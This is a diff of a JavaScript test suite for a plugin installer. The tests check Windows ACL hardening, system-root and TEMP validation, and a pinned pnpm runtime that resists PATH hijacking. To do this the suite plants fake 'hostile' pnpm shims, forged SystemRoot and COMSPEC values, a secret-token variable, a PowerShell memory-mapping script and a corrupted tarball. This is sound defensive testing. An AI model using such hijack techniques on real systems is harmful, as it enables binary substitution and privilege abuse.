+      platform: 'win32',
+      ...systemRootOptions,
+    }),
+    /local drive-absolute/
+  );
+  await assert.rejects(
+    () => secureWindowsPrivatePath(`C:\\${'a'.repeat(32_760)}`, 'directory', 'verify', {
+      environment: {},
+      execute,
+      expectedIdentity,
+      lstatPath,
+      platform: 'win32',
+      ...systemRootOptions,
+    }),
+    /too long/
+  );
+
+  if (process.platform === 'win32') {
+    assert.throws(
+      () => trustedWindowsSystemRoot({
+        platform: 'win32',
+        systemRootForTesting: 'D:\\forged-system-root',
+      }),
+      /cannot be overridden/
+    );
+  } else {
+    assert.equal(
+      trustedWindowsSystemRootFromCandidates([
+        { name: 'kernel32', value: 'C:\\Windows' },
+        { name: 'ntdll', value: 'c:\\WINDOWS\\' },
+      ]),
+      'C:\\Windows'
+    );
+    assert.throws(
+      () => trustedWindowsSystemRootFromCandidates([
+        { name: 'kernel32', value: 'C:\\Windows' },
+        { name: 'ntdll', value: 'D:\\Windows' },
+      ]),
+      /system roots disagree/
+    );
+    assert.equal(
+      windowsPowerShellTempParentFromEnvironment({
+        TEMP: 'C:\\Temp',
+        temp: 'c:\\TEMP\\',
+        TMP: 'C:\\TEMP',
+      }),
+      'C:\\Temp'
+    );
+    assert.throws(
+      () => windowsPowerShellTempParentFromEnvironment({
+        TEMP: 'C:\\Temp',
+        temp: 'D:\\Temp',
+      }),
+      /ambiguous Windows TEMP entries/u
+    );
+    assert.throws(
+      () => windowsPowerShellTempParentFromEnvironment({
+        TEMP: '\\\\server\\share\\temp',
+      }),
+      /local drive-absolute/u
+    );
+    for (const systemRootForTesting of [
+      'C:Windows',
+      '\\Windows',
+      '\\\\server\\share\\Windows',
+      '\\\\.\\C:\\Windows',
+    ]) {
+      assert.throws(
+        () => trustedWindowsSystemRoot({ platform: 'win32', systemRootForTesting }),
+        /local drive-absolute/
+      );
+    }
+  }
+});
+
+test('Windows strict ACL verification excludes an inherited writer until it closes', {
+  skip: process.platform !== 'win32',
+}, async (t) => {
+  const root = await realpath(await workspace(t));
+  const path = join(root, 'open-writer.key');
+  const handle = await open(path, 'wx', 0o600);
+  const expectedIdentity = await captureWindowsPrivatePathIdentity(path, 'file');
+  try {
+    const temporaryProof = await secureWindowsPrivatePath(
+      path,
+      'file',
+      'configure-open-writer',
+      { expectedIdentity }
+    );
+    assert.equal(temporaryProof.shareMode, 3);
+    await assert.rejects(
+      () => secureWindowsPrivatePath(path, 'file', 'verify', { expectedIdentity }),
+      /failed to enforce current-user SID-only Windows ACL/
+    );
+  } finally {
+    await handle.close();
+  }
+  const strictProof = await secureWindowsPrivatePath(
+    path,
+    'file',
+    'verify',
+    { expectedIdentity }
+  );
+  assert.equal(strictProof.shareMode, 1);
+});
+
+test('Windows strict ACL verification rejects a live read-write file mapping', {
+  skip: process.platform !== 'win32',
+}, async (t) => {
+  const root = await realpath(await workspace(t));
+  const path = join(root, 'mapped-writer.key');
+  await writeFile(path, Buffer.alloc(4096));
+  const expectedIdentity = await captureWindowsPrivatePathIdentity(path, 'file');
+  await secureWindowsPrivatePath(path, 'file', 'configure', { expectedIdentity });
+  const systemRoot = trustedWindowsSystemRoot();
+  const powershell = join(
+    systemRoot,
+    'System32',
+    'WindowsPowerShell',
+    'v1.0',
+    'powershell.exe'
+  );
+  const mappingScript = String.raw`
+$ErrorActionPreference = 'Stop'
+$stream = [IO.File]::Open(
+  $env:DSH_TEST_MAPPED_FILE,
+  [IO.FileMode]::Open,
+  [IO.FileAccess]::ReadWrite,
+  [IO.FileShare]::Read)
+$mapping = [IO.MemoryMappedFiles.MemoryMappedFile]::CreateFromFile(
+  $stream, $null, 0,
+  [IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWrite,
+  [IO.HandleInheritability]::None, $false)
+$view = $mapping.CreateViewAccessor()
+[Console]::WriteLine('ready')
+[void][Console]::In.ReadLine()
+$view.Dispose()
+$mapping.Dispose()
+$stream.Dispose()
+`;
+  const child = spawn(powershell, [
+    '-NoLogo', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass',
+    '-Command', mappingScript,
+  ], {
+    env: {
+      SystemRoot: systemRoot,
+      WINDIR: systemRoot,
+      DSH_TEST_MAPPED_FILE: path,
+    },
+    stdio: ['pipe', 'pipe', 'pipe'],
+    windowsHide: true,
+  });
+  t.after(() => {
+    if (child.exitCode === null) child.kill();
+  });
+  await new Promise((resolve, reject) => {
+    let stderr = '';
+    let settled = false;
+    const finish = (callback, value) => {
+      if (settled) return;
+      settled = true;
+      clearTimeout(timer);
+      callback(value);
+    };
+    const timer = setTimeout(() => {
+      finish(reject, new Error('mapped writer did not become ready'));
+    }, 10_000);
+    child.stderr.on('data', (chunk) => { stderr += chunk.toString('utf8'); });
+    child.once('error', (error) => finish(reject, error));
+    child.once('exit', (code) => finish(reject, new Error(
+      `mapped writer exited before readiness (${code}): ${stderr}`
+    )));
+    child.stdout.once('data', (chunk) => {
+      if (chunk.toString('utf8').trim() !== 'ready') {
+        finish(reject, new Error('mapped writer emitted malformed readiness'));
+      } else {
+        finish(resolve);
+      }
+    });
+  });
+  await assert.rejects(
+    () => secureWindowsPrivatePath(path, 'file', 'verify', { expectedIdentity }),
+    /failed to enforce current-user SID-only Windows ACL/u
+  );
+  const exited = once(child, 'exit');
+  child.stdin.end('release\n');
+  const [code] = await exited;
+  assert.equal(code, 0);
+  const proof = await secureWindowsPrivatePath(path, 'file', 'verify', { expectedIdentity });
+  assert.equal(proof.shareMode, 1);
+});
+
+test('Windows private ACL batches amortize one bounded PowerShell process without weakening proofs', async () => {
+  const calls = [];
+  const systemRootOptions = windowsSystemRootTestOptions();
+  const trustedSystemRoot = trustedWindowsSystemRoot({
+    platform: 'win32',
+    ...systemRootOptions,
+  });
+  const requests = [
+    {
+      path: 'C:\\private\\transaction',
+      kind: 'directory',
+      action: 'verify',
+      expectedIdentity: { volumeSerial: '52', fileIndex: '7001' },
+    },
+    {
+      path: 'C:\\private\\transaction\\state.json',
+      kind: 'file',
+      action: 'configure',
+      expectedIdentity: { volumeSerial: '52', fileIndex: '7002' },
+    },
+  ];
+  const lstatPath = async (path) => path.endsWith('.json')
+    ? fakeWindowsStat('file', 52, 7002)
+    : fakeWindowsStat('directory', 52, 7001);
+  const proofs = await secureWindowsPrivatePaths(requests, {
+    environment: {
+      SystemRoot: 'Z:\\forged-system-root',
+      WINDIR: 'Y:\\different-forged-system-root',
+      TEMP: 'C:\\Temp',
+      SECRET_TOKEN: 'must-not-cross-boundary',
+    },
+    execute: async (...args) => {
+      calls.push(args);
+      const bound = JSON.parse(Buffer.from(
+        args[2].env.DSH_PLUGIN_PRIVATE_BATCH,
+        'base64'
+      ).toString('utf8'));
+      return {
+        stdout: `${JSON.stringify(bound.map((request) => windowsAclProof(
+          request.kind,
+          request.volumeSerial,
+          request.fileIndex
+        )))}\n`,
+        stderr: '',
+      };
+    },
+    lstatPath,
+    platform: 'win32',
+    ...systemRootOptions,
+  });
+  assert.equal(calls.length, 1);
+  assert.equal(proofs.length, 2);
+  assert.equal(proofs[0].inheritanceFlags, 3);
+  assert.equal(proofs[1].inheritanceFlags, 0);
+  const [, args, options] = calls[0];
+  assert.equal(args[6], WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT);
+  assert.equal(options.timeout, WINDOWS_PRIVATE_ACL_TIMEOUT_MS);
+  assert.equal(options.env.DSH_PLUGIN_PRIVATE_PATH, undefined);
+  assert.equal(options.env.SECRET_TOKEN, undefined);
+  assert.equal(options.env.SystemRoot, trustedSystemRoot);
+  assert.equal(options.env.WINDIR, trustedSystemRoot);
+  assert.equal(options.env.TEMP, WINDOWS_POWERSHELL_TEMP_FOR_TESTING);
+  assert.equal(options.env.TMP, WINDOWS_POWERSHELL_TEMP_FOR_TESTING);
+  assert.deepEqual(
+    JSON.parse(Buffer.from(options.env.DSH_PLUGIN_PRIVATE_BATCH, 'base64').toString('utf8')),
+    requests.map(({ expectedIdentity, ...request }) => ({
+      ...request,
+      volumeSerial: expectedIdentity.volumeSerial,
+      fileIndex: expectedIdentity.fileIndex,
+    }))
+  );
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /FromBase64String\(\$batch\)/);
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /foreach \(\$request in \$requests\)/);
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /SetAccessRuleProtection\(true, false\)/u);
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /rules\.Count == 1/u);
+  assert.match(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /FileSystemRights\.FullControl/u);
+  assert.doesNotMatch(WINDOWS_CURRENT_USER_PRIVATE_ACL_SCRIPT, /S-1-5-18/);
+
+  await assert.rejects(
+    () => secureWindowsPrivatePaths([], {
+      environment: { SystemRoot: 'C:\\Windows' },
+      platform: 'win32',
+    }),
+    /batch is malformed/
+  );
+  await assert.rejects(
+    () => secureWindowsPrivatePaths(requests, {
+      environment: { SystemRoot: 'C:\\Windows' },
+      execute: async () => ({
+        stdout: `${JSON.stringify([windowsAclProof('directory', 52, 7001)])}\n`,
+        stderr: '',
+      }),
+      lstatPath,
+      platform: 'win32',
+      ...systemRootOptions,
+    }),
+    /proof count is invalid/
+  );
+  await assert.rejects(
+    () => secureWindowsPrivatePaths(requests, {
+      environment: { SystemRoot: 'C:\\Windows' },
+      execute: async () => ({
+        stdout: `${JSON.stringify([
+          windowsAclProof('directory', 52, 7001),
+          windowsAclProof('file', 52, 7002, { ownerSid: 'S-1-5-18' }),
+        ])}\n`,
+        stderr: '',
+      }),
+      lstatPath,
+      platform: 'win32',
+      ...systemRootOptions,
+    }),
+    /malformed or weaker/
+  );
+  await assert.rejects(
+    () => secureWindowsPrivatePaths([
+      {
+        path: 'C:\\private\\transaction\\state.json',
+        kind: 'file',
+        action: 'verify',
+        expectedIdentity: { volumeSerial: '52', fileIndex: '7999' },
+      },
+    ], {
+      environment: { SystemRoot: 'C:\\Windows' },
+      execute: async () => {
+        throw new Error('executor must not run for a caller/path identity mismatch');
+      },
+      lstatPath,
+      platform: 'win32',
+      ...systemRootOptions,
+    }),
+    /differs from caller-bound identities/
+  );
+  await assert.rejects(
+    () => secureWindowsPrivatePaths([
+      { path: 'C:\\private\\transaction', kind: 'directory', action: 'verify' },
+    ], {
+      environment: { SystemRoot: 'C:\\Windows' },
+      lstatPath,
+      platform: 'win32',
+    }),
+    /batch is malformed/
+  );
+  await assert.rejects(
+    () => secureWindowsPrivatePaths(Array.from({ length: 33 }, () => requests[0]), {
+      environment: { SystemRoot: 'C:\\Windows' },
+      platform: 'win32',
+    }),
+    /batch is malformed/
+  );
+});
+
+test('Windows recovery batching keeps handles open across ACL proof and preserves terminal-marker isolation', async () => {
+  const transactionSource = await readFile(
+    new URL('../skills/dsh-plugin-installer/scripts/install-transaction.mjs', import.meta.url),
+    'utf8'
+  );
+  const snapshotSource = await readFile(
+    new URL('../skills/dsh-plugin-installer/scripts/profile-snapshot.mjs', import.meta.url),
+    'utf8'
+  );
+  assert.match(transactionSource, /const prepared = \[\];[\s\S]*await open\(specification\.path, flags\)/);
+  assert.match(transactionSource, /await secureWindowsPrivatePaths\(aclRequests\)/);
+  assert.match(transactionSource, /samePrivateFileState\(entry\.stat, afterAcl\)/);
+  assert.match(transactionSource, /terminalMarkerPresent[\s\S]*recovery-auth\.json[\s\S]*in-progress\.json/);
+  assert.match(transactionSource, /windowsDirectories: \[[\s\S]*source transaction root[\s\S]*source transaction snapshot/);
+  assert.match(snapshotSource, /privateWriteBatch\(writes\)/);
+  assert.match(snapshotSource, /secureWindowsPrivatePaths\(\[[\s\S]*entryStates/);
+  assert.match(snapshotSource, /holdWindowsHandle: process\.platform === 'win32'/);
+  assert.match(snapshotSource, /expectedIdentity: state\.windowsBinding\.identity/);
+  assert.match(snapshotSource, /sameWindowsSnapshotFile\([\s\S]{0,80}state\.windowsBinding/);
 });
 
 test('Windows atomic restore secures an empty temp before writing and retains backup through target verification', async (t) => {
@@ -1798,6 +3189,7 @@ test('Windows atomic restore secures an empty temp before writing and retains ba
         events.push('sync-temp');
         return handle.sync();
       },
+      stat: (...statArgs) => handle.stat(...statArgs),
       close: () => handle.close(),
     };
   };
@@ -1823,9 +3215,10 @@ test('Windows atomic restore secures an empty temp before writing and retains ba
     randomId: () => (++id === 1 ? 'temporary' : 'backup'),
   });
   assert.equal(await readFile(target, 'utf8'), 'restored\n');
-  assert.ok(events.indexOf('acl-configure-temp') < events.indexOf('write-temp'));
-  assert.ok(events.indexOf('acl-verify-temp') < events.indexOf('write-temp'));
+  assert.ok(events.indexOf('acl-configure-open-writer-temp') < events.indexOf('write-temp'));
+  assert.ok(events.indexOf('write-temp') < events.indexOf('acl-verify-temp'));
   assert.ok(events.indexOf('sync-temp') < events.indexOf('rename-original-backup'));
+  assert.ok(events.indexOf('acl-verify-temp') < events.indexOf('rename-original-backup'));
   assert.ok(events.indexOf('rename-temp-target') < events.indexOf('acl-verify-target'));
   assert.ok(events.indexOf('acl-verify-target') < events.indexOf('remove-backup'));
 });
@@ -1862,60 +3255,84 @@ test('Windows atomic restore rolls back a failed target ACL verification, includ
   await assert.rejects(() => lstat(absentTarget), { code: 'ENOENT' });
 });
 
-test('private pnpm PATH binding pins the absolute 11.7.0 bytes and detects later replacement', async (t) => {
+test('private pnpm binding uses only the vendored 11.7.0 closure and defeats PATH pnpm', async (t) => {
   const root = await realpath(await workspace(t));
-  const sourceBin = join(root, 'source-bin');
+  const hostileBin = join(root, 'hostile-bin');
+  const lateHostileBin = join(root, 'late-hostile-bin');
   const profileCwd = join(root, 'profile-cwd');
   const runtimeRoot = join(root, 'runtime');
-  await mkdir(sourceBin);
+  await mkdir(hostileBin);
+  await mkdir(lateHostileBin);
   await mkdir(profileCwd);
   await mkdir(runtimeRoot);
-  const commandName = process.platform === 'win32' ? 'pnpm.cmd' : 'pnpm';
-  const source = join(sourceBin, commandName);
-  const cwdShadow = join(profileCwd, commandName);
-  const sourceBytes = process.platform === 'win32'
-    ? '@echo off\r\necho 11.7.0\r\n'
-    : '#!/bin/sh\nprintf "11.7.0\\n"\n';
-  await writeFile(source, sourceBytes, { mode: 0o700 });
+  const hostileName = process.platform === 'win32' ? 'pnpm.exe' : 'pnpm';
+  await writeFile(join(hostileBin, hostileName), 'hostile PATH pnpm\n', { mode: 0o700 });
   await writeFile(
-    cwdShadow,
+    join(profileCwd, hostileName),
     process.platform === 'win32'
-      ? '@echo off\r\necho 99.0.0\r\n'
+      ? 'hostile cwd pnpm.exe\r\n'
       : '#!/bin/sh\nprintf "99.0.0\\n"\n',
     { mode: 0o700 }
   );
+  const trustedSystemRoot = process.platform === 'win32'
+    ? await realpath(trustedWindowsSystemRoot())
+    : undefined;
   const environment = {
-    PATH: sourceBin,
-    PATHEXT: '.COM;.EXE;.BAT;.CMD',
-    SystemRoot: process.env.SystemRoot,
-    WINDIR: process.env.WINDIR,
+    PATH: [hostileBin, lateHostileBin].join(
+      process.platform === 'win32' ? ';' : delimiter
+    ),
+    PATHEXT: '.EXE;.CMD;.COM;.BAT',
+    SystemRoot: process.platform === 'win32'
+      ? join(profileCwd, 'forged-system-root')
+      : process.env.SystemRoot,
+    WINDIR: process.platform === 'win32'
+      ? join(profileCwd, 'different-forged-system-root')
+      : process.env.WINDIR,
     COMSPEC: process.platform === 'win32'
       ? join(profileCwd, 'untrusted-command-processor.exe')
       : process.env.COMSPEC,
     TEMP: process.env.TEMP ?? tmpdir(),
     TMP: process.env.TMP ?? tmpdir(),
   };
-  const identity = await resolvePnpmExecutable(environment, { commandCwd: profileCwd });
-  assert.equal(identity.path, await realpath(source));
-  assert.equal(identity.sha256, sha256(Buffer.from(sourceBytes)));
-
   const binding = await createPrivatePnpmBinding(environment, runtimeRoot, {
     commandCwd: profileCwd,
   });
   assert.equal(binding.receipt.version, '11.7.0');
-  assert.equal(binding.receipt.targetSha256, identity.sha256);
+  assert.equal(
+    binding.receipt.artifactSha256,
+    'deafa7ec98a1218b6a047289b92fbe2395c1e22d3495bb711653013218ee15ee'
+  );
+  assert.equal(binding.receipt.closureEntries, 449);
+  assert.equal(binding.receipt.schemaVersion, 3);
+  assert.equal(binding.receipt.callerPathPolicy, 'discarded-without-filesystem-resolution');
+  assert.equal(binding.receipt.discardedCallerPathEntries, 2);
   assert.equal(binding.receipt.privatePathPrecedence, true);
-  assert.equal(binding.environment.PATH.split(process.platform === 'win32' ? ';' : ':')[0], join(runtimeRoot, 'pnpm-binding'));
+  assert.equal(
+    binding.environment.PATH,
+    join(runtimeRoot, 'pnpm-binding')
+  );
+  assert.equal(binding.environment.PATH.includes(hostileBin), false);
+  assert.equal(binding.environment.PATH.includes(lateHostileBin), false);
   assert.equal(
     binding.environment.NoDefaultCurrentDirectoryInExePath,
     process.platform === 'win32' ? '1' : undefined
   );
   if (process.platform === 'win32') {
+    assert.equal(binding.environment.PATHEXT, '.CMD;.EXE;.COM;.BAT');
+    assert.equal(binding.environment.SystemRoot, trustedSystemRoot);
+    assert.equal(binding.environment.WINDIR, trustedSystemRoot);
     assert.equal(
       binding.environment.COMSPEC,
-      await realpath(join(process.env.SystemRoot, 'System32', 'cmd.exe'))
+      await realpath(join(trustedSystemRoot, 'System32', 'cmd.exe'))
     );
   }
+  await writeFile(
+    join(lateHostileBin, hostileName),
+    process.platform === 'win32'
+      ? 'late hostile pnpm.exe\r\n'
+      : '#!/bin/sh\nprintf "98.0.0\\n"\n',
+    { mode: 0o700 }
+  );
   const before = spawnSync('pnpm', ['--version'], {
     cwd: profileCwd,
     encoding: 'utf8',
@@ -1926,9 +3343,56 @@ test('private pnpm PATH binding pins the absolute 11.7.0 bytes and detects later
   assert.equal(before.status, 0);
   assert.equal(before.stdout.trim(), '11.7.0');
 
-  await writeFile(source, process.platform === 'win32'
-    ? '@echo off\r\necho 99.0.0\r\n'
-    : '#!/bin/sh\nprintf "99.0.0\\n"\n');
+  const fixture = await realpath(new URL('./fixtures/deep-ocean-1.2.0.tgz', import.meta.url));
+  await writeFile(join(profileCwd, 'package.json'), JSON.stringify({
+    name: 'private-pnpm-semantics',
+    version: '1.0.0',
+    private: true,
+  }, null, 2));
+  const add = spawnSync(binding.environment.DSH_PLUGIN_PNPM_NODE, [
+    binding.environment.DSH_PLUGIN_PNPM_CLI,
+    'add',
+    '--save-exact',
+    '--ignore-scripts',
+    '--lockfile-only',
+    '--ignore-pnpmfile',
+    '--',
+    fixture,
+  ], {
+    cwd: profileCwd,
+    encoding: 'utf8',
+    env: binding.environment,
+    shell: false,
+    timeout: 30_000,
+    windowsHide: true,
+  });
+  assert.equal(add.status, 0, add.stderr);
+  assert.match(
+    JSON.parse(await readFile(join(profileCwd, 'package.json'), 'utf8'))
+      .dependencies['@dsh-themes/deep-ocean'],
+    /^file:.*deep-ocean-1\.2\.0\.tgz$/u
+  );
+  const removeResult = spawnSync(binding.environment.DSH_PLUGIN_PNPM_NODE, [
+    binding.environment.DSH_PLUGIN_PNPM_CLI,
+    'remove',
+    '--lockfile-only',
+    '--',
+    '@dsh-themes/deep-ocean',
+  ], {
+    cwd: profileCwd,
+    encoding: 'utf8',
+    env: binding.environment,
+    shell: false,
+    timeout: 30_000,
+    windowsHide: true,
+  });
+  assert.equal(removeResult.status, 0, removeResult.stderr);
+  assert.equal(
+    JSON.parse(await readFile(join(profileCwd, 'package.json'), 'utf8')).dependencies,
+    undefined
+  );
+
+  await writeFile(binding.environment.DSH_PLUGIN_PNPM_CLI, 'tampered private CLI\n');
   const after = spawnSync('pnpm', ['--version'], {
     cwd: profileCwd,
     encoding: 'utf8',
@@ -1937,11 +3401,42 @@ test('private pnpm PATH binding pins the absolute 11.7.0 bytes and detects later
     windowsHide: true,
   });
   assert.notEqual(after.status, 0);
-  assert.match(after.stderr, /bound pnpm (?:digest|identity) changed/);
-  assert.doesNotMatch(after.stderr, new RegExp(source.replace(/[.*+?^${}()|[\]\\]/gu, '\\$&')));
+  assert.match(after.stderr, /private pnpm CLI changed/);
+  assert.doesNotMatch(after.stderr, new RegExp(hostileBin.replace(/[.*+?^${}()|[\]\\]/gu, '\\$&')));
 });
 
-test('private pnpm binding rejects unsupported execution platforms before PATH resolution', async () => {
+test('vendored pnpm authority binds the official tarball and rejects byte or closure drift', async () => {
+  const { authority } = await loadPnpmRuntimeAuthority();
+  const artifact = await readFile(new URL(
+    '../skills/dsh-plugin-installer/assets/pnpm-runtime/pnpm-11.7.0.tgz',
+    import.meta.url
+  ));
+  const verified = validatePnpmRuntimeArtifact(artifact, authority);
+  assert.equal(verified.entries.length, 449);
+  assert.equal(pnpmRuntimeClosureSha512(verified.entries), authority.closure.sha512);
+  const poisoned = Buffer.from(artifact);
+  poisoned[Math.floor(poisoned.length / 2)] ^= 0x01;
+  assert.throws(
+    () => validatePnpmRuntimeArtifact(poisoned, authority),
+    /artifact bytes, SHA-256, or dist\.integrity mismatch/
+  );
+  const extra = [...verified.entries, {
+    name: 'package/undeclared.js',
+    type: '0',
+    mode: 0o644,
+    size: 1,
+    body: Buffer.from('x'),
+  }];
+  assert.notEqual(pnpmRuntimeClosureSha512(extra), authority.closure.sha512);
+  const rewrittenAuthority = structuredClone(authority);
+  rewrittenAuthority.source.artifactSha256 = '0'.repeat(64);
+  assert.throws(
+    () => validatePnpmRuntimeAuthority(rewrittenAuthority),
+    /authority is malformed/u
+  );
+});
+
+test('private pnpm binding fixes Windows PATHEXT and rejects unsupported platforms', async () => {
   assert.equal(requiresPnpmCommandShimShell('darwin'), false);
   assert.equal(requiresPnpmCommandShimShell('linux'), false);
   assert.equal(requiresPnpmCommandShimShell('win32'), true);
@@ -1956,10 +3451,12 @@ test('private pnpm binding rejects unsupported execution platforms before PATH r
   );
   assert.throws(() => pnpmCommandShimShell({ COMSPEC: 'cmd.exe' }, 'win32'), /absolute/);
   assert.throws(() => requiresPnpmCommandShimShell('freebsd'), /unsupported on freebsd/);
-  await assert.rejects(
-    () => resolvePnpmExecutable({ PATH: '/not/consulted' }, { platform: 'freebsd' }),
-    /unsupported on freebsd/
+  assert.equal(validatePrivatePnpmPathext('.CMD;.EXE;.COM;.BAT'), '.CMD;.EXE;.COM;.BAT');
+  assert.throws(
+    () => validatePrivatePnpmPathext('.EXE;.CMD;.COM;.BAT'),
+    /put \.CMD before/
   );
+  assert.throws(() => validatePrivatePnpmPathext('.EXE;.COM;.BAT'), /put \.CMD before/);
 });
 
 test('effective policy verification executes the platform pnpm shim with only fixed keys', async (t) => {
@@ -2355,7 +3852,8 @@ test('Plugin Skill keeps Top10 and all 80 entries fail closed without receipts',
   assert.match(skill, /npm-package-version/);
   assert.match(skill, /github-release-asset/);
   assert.match(skill, /git-commit/);
-  assert.match(skill, /fixed argument array and\n+   `shell: false`/);
+  assert.match(skill, /fixed argument array, `shell: false`, `--` option termination/);
+  assert.match(skill, /no caller-PATH pnpm, Corepack implementation/);
   assert.match(skill, /writes `state\.json` with `status: "committed"` only after/);
   assert.match(skill, /failed single item or Top10 member restores the entire retained/);
   assert.match(skill, /current-user SID-only/);
